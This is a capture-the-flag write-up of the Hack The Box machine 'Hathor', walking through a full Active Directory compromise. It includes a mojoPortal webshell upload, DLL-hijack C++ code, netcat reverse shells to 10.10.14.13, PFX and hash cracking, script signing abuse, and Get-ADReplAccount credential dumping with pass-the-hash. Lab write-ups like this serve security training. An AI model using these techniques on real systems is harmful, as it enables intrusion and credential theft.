---
description: >-
  Doing Sekhmet before this is super helpful, but still it is super hard. There
  are multiple different users we get shells as, and this writeup will divide
  them as follows instead of the usual.
---

# Hathor

## Windcorp\web Shell

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.71.218 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 11:28 EDT
Nmap scan report for 10.129.71.218
Host is up (0.0070s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
49701/tcp open  unknown
```

We can do a detailed scan for this because I don't want to miss anything from this machine.

```
$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -O --min-rate 3000 10.129.71.218
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-robots.txt: 29 disallowed entries (15 shown)
| /CaptchaImage.ashx* /Admin/ /App_Browsers/ /App_Code/ 
| /App_Data/ /App_Themes/ /bin/ /Blog/ViewCategory.aspx$ 
| /Blog/ViewArchive.aspx$ /Data/SiteImages/emoticons /MyPage.aspx 
|_/MyPage.aspx$ /MyPage.aspx* /NeatHtml/ /NeatUpload/
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Home - mojoPortal
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-11 15:30:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-11T15:32:09+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
|_ssl-date: 2023-05-11T15:32:09+00:00; -3s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
|_ssl-date: 2023-05-11T15:32:09+00:00; -3s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
|_ssl-date: 2023-05-11T15:32:09+00:00; -3s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

The first thing we notice is the domain name, which is `hathor.windcorp.htb`. This has all the ports open, so it might be the DC itself. We can add the domain name to our `/etc/hosts` file.&#x20;

### Web Enum -> Default Creds

Port 80 shows a corporate page that is still under construction:

<figure><img src="../../../.gitbook/assets/image (2238).png" alt=""><figcaption></figcaption></figure>

At the bottom of the page, there's a link that brings us to a login page on the website:

<figure><img src="../../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>

Viewing the page source reveals this is a mojoPortal instance:

<figure><img src="../../../.gitbook/assets/image (3337).png" alt=""><figcaption></figcaption></figure>

A quick Google search for mojoPortal exploits and default credentials led to this:

<figure><img src="../../../.gitbook/assets/image (1044).png" alt=""><figcaption></figcaption></figure>

Surprisingly, this worked!

### Admin Panel -> Move RCE

The administrator panel lets us edit the pages and what is shown:

<figure><img src="../../../.gitbook/assets/image (701).png" alt=""><figcaption></figcaption></figure>

This is an IIS server, so uploading an `.aspx` reverse shell might work. Head to File Manager > Upload Files:

<figure><img src="../../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>

When trying to upload, it doesn't work.

<figure><img src="../../../.gitbook/assets/image (3515).png" alt=""><figcaption></figcaption></figure>

If we change it to `cmd.txt`, it works.&#x20;

<figure><img src="../../../.gitbook/assets/image (1501).png" alt=""><figcaption></figcaption></figure>

Then it shows up here:

<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

Interestingly, there's a Move function as well, and we can try moving this to be `cmd.aspx`.

<figure><img src="../../../.gitbook/assets/image (1166).png" alt=""><figcaption></figcaption></figure>

We can try to rename it as `cmd.aspx`, and it seems to work:

<figure><img src="../../../.gitbook/assets/image (2368).png" alt=""><figcaption></figcaption></figure>

Turns out this is actually a CVE:

{% embed url="https://weed-1.gitbook.io/cve/mojoportal/upload-malicious-file-in-mojoportal-v2.7-cve-2022-40341" %}

Anyways, we can access our webshell using this CVE:

<figure><img src="../../../.gitbook/assets/image (2443).png" alt=""><figcaption></figcaption></figure>

However, getting **ANY** shell fails to work. Similar to Sekhmet (which I actually solved before this), there's some kind of firewall in use here that is blocking us.

### Firewall + AppLocker Enum

Since this was the first machine before Sekhmet which also had AppLocker, we can run some `powershell` enumeration to find out what exactly can be done:

```powershell
powershell.exe -c Get-AppLockerPolicy -Effective -Xml
```

This would generate a massive string of stuff that we can and cannot execute.&#x20;

<figure><img src="../../../.gitbook/assets/image (2054).png" alt=""><figcaption></figcaption></figure>

Here is what is allowed for files and binaries:

{% code overflow="wrap" %}
```markup
<FilePathRule Id="059bf360-e712-427a-8255-59d182bc4cd5" Name="%OSDRIVE%\share\scripts\7-zip64.dll" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">

<FilePathRule Id="3a07aecc-17f3-43e5-911b-ddb7e4d7353f" Name="%OSDRIVE%\Get-bADpasswords\PSI\Psi_x64.dll" Description="" UserOrGroupSid="S-1-5-21-3783586571-2109290616-3725730865-10102" Action="Allow">

<AppLockerPolicy Version="1"><RuleCollection Type="Appx" EnforcementMode="Enabled"><FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow">
```
{% endcode %}

I don't think it's possible to replace these DLLs, and even if for some reason I have write access, I cannot restart these processes. Also, unsigned binaries like `nc.exe` won't run properly.&#x20;

In this case, we can try some better webshells that don't rely on external binaries to run.&#x20;

{% embed url="https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx" %}

Insomnia shell is a fully implemented web shell that can give us a reverse shell without the use of external binaries. We can upload this one and try again.

<figure><img src="../../../.gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>

Using this, we can get a reverse shell as `web`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2237).png" alt=""><figcaption></figcaption></figure>

## GinaWild Shell

### Bad Passwords -> User Creds

Earlier, I saw some kind of Powershell script called `Get-bADpasswords` in use, so let's find that.&#x20;

```
c:\Get-bADpasswords>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\Get-bADpasswords

10/12/2022  09:30 PM    <DIR>          .
09/29/2021  08:18 PM    <DIR>          Accessible
10/12/2022  10:04 PM            11,694 CredentialManager.psm1
03/21/2022  03:59 PM            20,320 Get-bADpasswords.ps1
09/29/2021  06:53 PM           177,250 Get-bADpasswords_2.jpg
10/12/2022  10:04 PM             5,184 Helper_Logging.ps1
10/12/2022  10:04 PM             6,561 Helper_Passwords.ps1
09/29/2021  06:53 PM           149,012 Image.png
09/29/2021  06:53 PM             1,512 LICENSE.md
10/12/2022  10:04 PM             4,499 New-bADpasswordLists-Common.ps1
10/12/2022  10:04 PM             4,335 New-bADpasswordLists-Custom.ps1
10/12/2022  10:04 PM             4,491 New-bADpasswordLists-customlist.ps1
10/12/2022  10:04 PM             4,740 New-bADpasswordLists-Danish.ps1
10/12/2022  10:04 PM             4,594 New-bADpasswordLists-English.ps1
10/12/2022  10:04 PM             4,743 New-bADpasswordLists-Norwegian.ps1
09/29/2021  06:54 PM    <DIR>          PSI
09/29/2021  06:53 PM             6,567 README.md
10/12/2022  10:04 PM             3,982 run.vbs
09/29/2021  06:54 PM    <DIR>          Source
```

Within one if the directories, there's a bunch of different CSVs present:

```
c:\Get-bADpasswords\Accessible\CSVs>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\Get-bADpasswords\Accessible\CSVs

10/13/2022  09:09 PM    <DIR>          .
09/29/2021  08:18 PM    <DIR>          ..
10/03/2021  05:35 PM               248 exported_windcorp-03102021-173510.csv
10/03/2021  06:07 PM               248 exported_windcorp-03102021-180635.csv
10/03/2021  06:21 PM               112 exported_windcorp-03102021-182114.csv
10/03/2021  06:22 PM               112 exported_windcorp-03102021-182259.csv
10/03/2021  06:28 PM               248 exported_windcorp-03102021-182627.csv
10/03/2021  06:52 PM               248 exported_windcorp-03102021-185058.csv
10/04/2021  11:37 AM               248 exported_windcorp-04102021-113140.csv
10/05/2021  06:40 PM               248 exported_windcorp-05102021-183949.csv
10/13/2022  09:13 PM               248 exported_windcorp-13102022-210856.csv
10/13/2022  09:13 PM               248 exported_windcorp-13102022-210946.csv
03/17/2022  05:40 AM               112 exported_windcorp-17032022-044053.csv
03/18/2022  05:40 AM               112 exported_windcorp-18032022-044046.csv
```

Reading the latest one reveals a hash:

{% code overflow="wrap" %}
```
c:\Get-bADpasswords\Accessible\CSVs>type exported_windcorp-13102022-210856.csv

Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passwords-v7'
```
{% endcode %}

This is crackable:

<figure><img src="../../../.gitbook/assets/image (3811).png" alt=""><figcaption></figcaption></figure>

`!!!!ilovegood17` is the password here.

### NTLM Ban -> Beatrice Ticket

I tried to use `crackmapexec`, but it doesn't work:

```
$ crackmapexec smb 10.129.71.218 -u 'BeatriceMill' -p '!!!!ilovegood17'  
SMB         10.129.71.218   445    10.129.71.218    [*]  x64 (name:10.129.71.218) (domain:10.129.71.218) (signing:True) (SMBv1:False)
SMB         10.129.71.218   445    10.129.71.218    [-] 10.129.71.218\BeatriceMill:!!!!ilovegood17 STATUS_NOT_SUPPORTED
```

`STATUS_NOT_SUPPORTED` is an error that looks like it's going to be a reoccuring theme throughout this machine. A bit of research reveals that this is due to NTLM not being able to be used as an authentication method on this machine.

{% embed url="https://care.qumulo.com/hc/en-us/articles/360001006108-Resolve-failing-SMB-Client-Connections-with-NTLM-Authentication-#adjust-ntlm-authentication-level-0-4" %}

This means that only Kerberos tickets would work in trying to authenticate in this machine. For this case, we have to use `kinit` to get a ticket, similar to another machine Absolute. We need to include this within our `/etc/krb5.conf` file:

```
[libdefaults]
	default_realm = WINDCORP.HTB
[realms]
	ABSOLUTE.HTB = {
                kdc = HATHOR.WINDCORP.HTB
                admin_server = HATHOR.WINDCORP.HTB
        }
```

Then we can run `kinit` and give it the credentials we got earlier:

```
$ kinit BeatriceMill  
Password for BeatriceMill@WINDCORP.HTB:

$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: BeatriceMill@WINDCORP.HTB

Valid starting       Expires              Service principal
05/11/2023 12:19:27  05/11/2023 22:19:27  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 05/12/2023 12:19:22
```

Great! Now we can finally view the shares:

```
$ smbclient -L //hathor.windcorp.htb -U BeatriceMill -N -k
WARNING: The option -k|--kerberos is deprecated!

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        share           Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to hathor.windcorp.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can connect using `smbclient.py`.&#x20;

```
$ impacket-smbclient -k 'windcorp.htb/BeatriceMill:!!!!ilovegood17@hathor.windcorp.htb'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
share
SYSVOL
```

### SMB Enumeration -> DLL Hijack

Within the `share` share, we can find some stuff:

```
# use share
# ls
drw-rw-rw-          0  Thu May 11 12:17:42 2023 .
drw-rw-rw-          0  Tue Apr 19 08:45:15 2022 ..
-rw-rw-rw-    1013928  Thu May 11 12:18:02 2023 AutoIt3_x64.exe
-rw-rw-rw-    4601208  Thu May 11 12:21:31 2023 Bginfo64.exe
drw-rw-rw-          0  Mon Mar 21 17:22:59 2022 scripts

# cd scripts
# ls
drw-rw-rw-          0  Mon Mar 21 17:22:59 2022 .
drw-rw-rw-          0  Thu May 11 12:17:42 2023 ..
-rw-rw-rw-    1076736  Thu May 11 12:22:41 2023 7-zip64.dll
-rw-rw-rw-      54739  Sun Jan 23 05:54:21 2022 7Zip.au3
-rw-rw-rw-       2333  Sun Jan 23 05:54:21 2022 ZipExample.zip
-rw-rw-rw-       1794  Sun Jan 23 05:54:21 2022 _7ZipAdd_Example.au3
-rw-rw-rw-       1855  Sun Jan 23 05:54:21 2022 _7ZipAdd_Example_using_Callback.au3
-rw-rw-rw-        334  Sun Jan 23 05:54:21 2022 _7ZipDelete_Example.au3
-rw-rw-rw-        859  Sun Jan 23 05:54:21 2022 _7ZIPExtractEx_Example.au3
-rw-rw-rw-       1867  Sun Jan 23 05:54:21 2022 _7ZIPExtractEx_Example_using_Callback.au3
-rw-rw-rw-        830  Sun Jan 23 05:54:21 2022 _7ZIPExtract_Example.au3
-rw-rw-rw-       2027  Sun Jan 23 05:54:21 2022 _7ZipFindFirst__7ZipFindNext_Example.au3
-rw-rw-rw-        372  Sun Jan 23 05:54:21 2022 _7ZIPUpdate_Example.au3
-rw-rw-rw-        886  Sun Jan 23 05:54:21 2022 _Archive_Size.au3
-rw-rw-rw-        201  Sun Jan 23 05:54:21 2022 _CheckExample.au3
-rw-rw-rw-        144  Sun Jan 23 05:54:21 2022 _GetZipListExample.au3
-rw-rw-rw-        498  Sun Jan 23 05:54:21 2022 _MiscExamples.au3
```

So that's where the `7-zip64.dll` file is located. One of the things I noticed is that we can write to it. We can perform the DLL HIjacking attack for this. Because of AppLocker, I think that `msfvenom` generated DLLs won't work, so let's create our own.&#x20;

```cpp
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
#include "pch.h
#include <stdlib.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\Windows\\Tasks\\whoami.txt");
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

I grabbed this script from Hacktricks, and we can build it within VS Code in our Windows machine. Afterwards, we can grab this DLL and place it within the share.&#x20;

```
# put 7-zip64.dll
# ls
drw-rw-rw-          0  Mon Mar 21 17:22:59 2022 .
drw-rw-rw-          0  Thu May 11 22:57:42 2023 ..
-rw-rw-rw-      10240  Thu May 11 23:05:19 2023 7-zip64.dll
-rw-rw-rw-      54739  Sun Jan 23 05:54:21 2022 7Zip.au3
-rw-rw-rw-       2333  Sun Jan 23 05:54:21 2022 ZipExample.zip
-rw-rw-rw-       1794  Sun Jan 23 05:54:21 2022 _7ZipAdd_Example.au3
-rw-rw-rw-       1855  Sun Jan 23 05:54:21 2022 _7ZipAdd_Example_using_Callback.au3
-rw-rw-rw-        334  Sun Jan 23 05:54:21 2022 _7ZipDelete_Example.au3
-rw-rw-rw-        859  Sun Jan 23 05:54:21 2022 _7ZIPExtractEx_Example.au3
-rw-rw-rw-       1867  Sun Jan 23 05:54:21 2022 _7ZIPExtractEx_Example_using_Callback.au3
-rw-rw-rw-        830  Sun Jan 23 05:54:21 2022 _7ZIPExtract_Example.au3
-rw-rw-rw-       2027  Sun Jan 23 05:54:21 2022 _7ZipFindFirst__7ZipFindNext_Example.au3
-rw-rw-rw-        372  Sun Jan 23 05:54:21 2022 _7ZIPUpdate_Example.au3
-rw-rw-rw-        886  Sun Jan 23 05:54:21 2022 _Archive_Size.au3
-rw-rw-rw-        201  Sun Jan 23 05:54:21 2022 _CheckExample.au3
-rw-rw-rw-        144  Sun Jan 23 05:54:21 2022 _GetZipListExample.au3
-rw-rw-rw-        498  Sun Jan 23 05:54:21 2022 _MiscExamples.au3
```

Afterwards, we can wait for a bit then check the `C:\Windows\Tasks` folder. Eventually, I would see that it did create a file:

```
C:\Windows\Tasks>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of C:\Windows\Tasks

05/12/2023  05:12 AM    <DIR>          .
04/19/2022  02:44 PM    <DIR>          ..
05/12/2023  05:12 AM                19 whoami.txt
               1 File(s)             19 bytes
               2 Dir(s)   9,334,525,952 bytes free

C:\Windows\Tasks>type whoami.txt
type whoami.txt
Access is denied.
```

I can't read it, meaning this is probably another user. There seems to be a really aggressive script that is cleaning this up every minute, because it wasn't long before this file disappeared. While waiting, I checked the AppLocker policy for the .exe files:

{% code overflow="wrap" %}
```markup
<FilePathRule Id="39b55ed3-c958-4d5c-846e-e338b7387fc9" Name="%OSDRIVE%\share\Bginfo64.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
```
{% endcode %}

It seems that this file can be run regardless of what it is. Now that we have RCE as another user, let's try to enumerate who this user is and what they can do. Since the `Bginfo64.exe` file can be run, let's see if we can overwrite it with our own file like `nc.exe`.&#x20;

First we enumerate using this new DLL:

```cpp
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
#include "pch.h
#include <stdlib.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /c whoami /all > C:\\users\\public\\whoami.txt");
            system("cmd.exe /c icacls C:\\share\\* > C:\\users\\public\\icacls.txt");
            system("cmd.exe /c icacls C:\\share\\scripts\\* >> C:\\users\\public\\icacls.txt");
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

After a while, it would create those files. Here's the interesting output:

{% code overflow="wrap" %}
```
C:\Users\Public>type whoami.txt

USER INFORMATION
----------------

User Name         SID                                           
================= ==============================================
windcorp\ginawild S-1-5-21-3783586571-2109290616-3725730865-2663
<TRUNCATED>
WINDCORP\ITDep                             Group            S-1-5-21-3783586571-2109290616-3725730865-9601 Mandatory group, Enabled by default, Enabled group

C:\Users\Public>type icacls.txt
C:\share\Bginfo64.exe NT AUTHORITY\IUSR:(I)(N)
                      BUILTIN\IIS_IUSRS:(I)(N)
                      WINDCORP\web:(I)(N)
                      BUILTIN\Administrators:(I)(M,WO,DC)
                      NT AUTHORITY\SYSTEM:(I)(F)
                      WINDCORP\ITDep:(I)(RX,WO)
                      BUILTIN\Administrators:(I)(F)
                      BUILTIN\Users:(I)(RX)
```
{% endcode %}

It appears that the user is `ginawild`, and is part of the ITDep group. Also, this user has Write Owner privileges over the `Bginfo64.exe` file. This means we can take over as the owner of the file, replace it with `nc.exe` , change the permissions to let everyone execute it, and then execute it to gain a reverse shell as `ginawild`.&#x20;

Before doing so, we need to get the file over. SMB wasn't going to work as something is closing our connection.  `powershell` itself runs with very little allowance. So, let's re-use the file upload vulnerability we found earlier, and upload our `nc64.exe` shell to the website.&#x20;

My final DLL looks something like this:

{% code overflow="wrap" %}
```cpp
system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
system("cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F");
system("cmd.exe /c copy C:\\inetpub\\wwwroot\\Data\\Sites\\1\\Media\\nc.exe C:\\share\\Bginfo64.exe");
system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd.exe 10.10.14.13 4444");
```
{% endcode %}

After waiting for a little bit, we will get a shell back!

<figure><img src="../../../.gitbook/assets/image (3183).png" alt=""><figcaption></figcaption></figure>

We can now grab the user flag.&#x20;

## Bpassrunner Shell

### Recycle Bin -> PFX Crack

Within the main `C:\` directory, there are some files within the Recycle Bin.&#x20;

```
c:\>dir /a 
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\

02/14/2022  08:48 PM    <DIR>          $Recycle.Bin
04/19/2022  02:24 PM    <DIR>          $WinREAgent

c:\$Recycle.Bin>dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\$Recycle.Bin

02/14/2022  08:48 PM    <DIR>          .
04/19/2022  02:45 PM    <DIR>          ..
02/14/2022  08:48 PM    <DIR>          S-1-5-18
10/07/2021  12:51 AM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2359
10/13/2022  09:11 PM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2663
10/13/2022  09:05 PM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-500
```

We can only access one of the directories, and it just has a bunch of `.pfx` files.

```
c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663

10/12/2022  09:26 PM                98 $IZIX7VV.pfx
03/21/2022  04:37 PM             4,053 $RLYS3KF.pfx
10/12/2022  08:43 PM             4,280 $RZIX7VV.pfx
```

To transfer the files, we can copy them over to the `C:\share` directory and download them from SMB. All 3 files are data:

```
$ file *.pfx         
$IZIX7VV.pfx: data
$RLYS3KF.pfx: data
$RZIX7VV.pfx: data
```

Since all 3 are `pfx`, let's try to use `pfx2john` to crack them. We would be able to find one of the passwords:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash  
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Loaded hashes with cost 1 (iteration count) varying from 2000 to 2048
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
abceasyas123     ($RLYS3KF.pfx)
```

Now we can use `openssl` to read more information about this:

```
$ openssl pkcs12 -info -in '$RLYS3KF.pfx'
Enter Import Password:
MAC: sha1, Iteration 2048
MAC length: 20, salt length: 8
PKCS7 Encrypted data: pbeWithSHA1And40BitRC2-CBC, Iteration 2048
Certificate bag
Bag Attributes
    localKeyID: 20 4F 12 47 3F D6 91 15 84 50 12 15 75 82 70 B2 57 01 D0 49 
subject=DC = htb, DC = windcorp, CN = Users, CN = Administrator
```

So this is from the Administrator. Since we have a `.pfx` from the administrator, we can actually use this. In the AppLocker conditions, we can see the subject match some conditions:

<pre class="language-markup" data-overflow="wrap"><code class="lang-markup">&#x3C;RuleCollection Type="Script" EnforcementMode="Enabled">&#x3C;FilePublisherRule Id="12bce21d-8da4-4f93-ab24-eeb9ad0bcc6d" Name="Signed by CN=ADMINISTRATOR, CN=USERS, DC=WINDCORP, DC=HTB" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
<strong>&#x3C;FilePublisherCondition PublisherName="CN=ADMINISTRATOR, CN=USERS, DC=WINDCORP, DC=HTB" ProductName="*" BinaryName="*">
</strong></code></pre>

This means that we can run 'any program' if we import this into the Certificate Store of the machine. The question is, what script do we run?

### Script Hijack -> Shell

I was still curious about the `Get-bADpasswords.ps1` script, what was the point of it? I checked the ACLs of it, and found that I could overwrite it:

```
c:\Get-bADpasswords>icacls Get-bADpasswords.ps1
icacls Get-bADpasswords.ps1
Get-bADpasswords.ps1 WINDCORP\ITDep:(I)(M)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)
                     BUILTIN\Users:(I)(RX)
```

We have Modify Access to this file. So in this case, we can replace it with our own AND then sign it using the certificate. I downloaded it, and made a small edit at the top to use our `Bginfo64.exe` file (which is still `nc.exe`) to gain another reverse shell.

```
C:\share\Bginfo64.exe -e cmd.exe 10.10.14.13 5555
```

Afterwards, we can re-upload this to SMB and use `copy` to overwrite the existing script. Now, we need to sign the script.&#x20;

{% embed url="https://codesigningstore.com/how-to-sign-a-powershell-script" %}

Using the above resource, we can run these commands to sign it:

{% code overflow="wrap" %}
```powershell
$pass = ConvertTo-SecureString -String 'abceasyas123' -AsPlainText -Force
$pfx = Import-PfxCertificate -FilePath 'C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx' -Password $pass -CertStoreLocation Cert:\CurrentUser\My
Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert
Set-AuthenticodeSignature .\Get-bADpasswords.ps1 $pfx
```
{% endcode %}

This script should let us know that we have imported it:

<figure><img src="../../../.gitbook/assets/image (1152).png" alt=""><figcaption></figcaption></figure>

It should also let us know that we have signed it successfully:

<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

Then, there's a `run.vbs` script that looks like it executes the file:

```
PS C:\Get-bADpasswords> cat run.vbs 
cat run.vbs
Set WshShell = CreateObject("WScript.Shell")
Command = "eventcreate /T Information /ID 444 /L Application /D " & _
    Chr(34) & "Check passwords" & Chr(34)
WshShell.Run Command
```

We can simply use `cscript ./run.vbs` to run this, and we would get another reverse shell:

<figure><img src="../../../.gitbook/assets/image (1534).png" alt=""><figcaption></figcaption></figure>

## Root Shell

### Get-ADReplAccount -> Hashes

So this user is in charge of running the script that checks whether there are weak passwords. Witin the script, I found this part here:

{% code overflow="wrap" %}
```powershell
try {
    $ad_users = Get-ADReplAccount -All -Server $domain_controller -NamingContext $naming_context | where { $_.SamAccountType -eq 'User' } | select SamAccountName,SID,Enabled,@{ N="NtHash"; E={ ConvertTo-Hex $_.NTHash }},@{ N="Activity"; E={ if ($_.Enabled) { 'active' } else { 'inactive' } }},@{ N="PrivilegeType"; E={ 'regular' }}

} catch {
	Log-Automatic -string $_.Exception.Message -type 'fail' -timestamp
	exit
}
```
{% endcode %}

It appears this user can use `Get-ADReplAccount` to retrieve NTLM hashes for users. I found some cheatsheetys for this command online as well:

{% embed url="https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADReplAccount.md" %}

Using this, we can retrieve the hash of the administrator.

```
PS C:\> Get-ADReplAccount -SamAccountName "Administrator" -Server "windcorp.htb"
<TRUNCATED>
SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-3783586571-2109290616-3725730865-512
Secrets
  NTHash: <REDACTED>
  LMHash: 
  NTHashHistory: 
    Hash 01: <REDACTED>
    Hash 02: <REDACTED>
    Hash 03: <REDACTED>
  LMHashHistory: 
    Hash 01: <REDACTED>
    Hash 02: <REDACTED>
  SupplementalCredentials:
    ClearText: 
    NTLMStrongHash: <REDACTED>
<TRUNCATED>
```

### Kerberos Ticket -> Shell

Using this NTLM hash, we have to request for a Kerberos ticket because NTLM hashes have been disabled.&#x20;

```
$ impacket-getTGT -hashes b3ff8d7532eef396a5347ed33933030f:b3ff8d7532eef396a5347ed33933030f windcorp.htb/administrator@windcorp.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in administrator@windcorp.htb.ccache

$ export KRB5CCNAME=administrator@windcorp.htb.ccache
```

Then, we can use this ticket to get a shell using this ticket:

<figure><img src="../../../.gitbook/assets/image (3233).png" alt=""><figcaption></figcaption></figure>

Rooted! Although hard, this machine had steps that were simple if the enumeration was done properly. Great machine!&#x20;
